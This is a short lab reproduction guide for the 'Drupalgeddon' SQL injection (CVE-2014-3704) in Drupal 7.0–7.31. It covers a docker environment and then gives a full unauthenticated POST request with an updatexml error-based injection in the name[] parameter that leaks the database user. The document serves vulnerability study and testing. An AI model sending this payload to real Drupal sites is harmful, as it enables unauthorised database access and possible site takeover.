# Drupal < 7.32 "Drupalgeddon" SQL Injection Vulnerability (CVE-2014-3704)

Drupal is a large-scale CMS, and there is a SQL vulnerability that does not require authentication in the 7.0~7.31 version. Through this vulnerability, an attacker can execute arbitrary SQL statements, insert, modify administrator information, and even execute arbitrary code.

## vulnerability environment

Run the following command to start the Drupal 7.31 environment:

```
Docker-compose up -d
```

After the environment is started, visit `http://your-ip:8080` to see the Drupal installation page, and install it using the default configuration.

Among them, the Mysql database name is filled in `drupal`, the database user name and password are `root`, and the address is `mysql`:

![](1.png)

After the installation is complete, visit the home page:

![](2.png)

## Vulnerability recurrence

The vulnerability does not require authentication, and a malicious SQL statement can be executed by sending the following packet:

```
POST /?q=node&destination=node HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

Pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a
```

Visible, the information has been revealed:

![](3.png)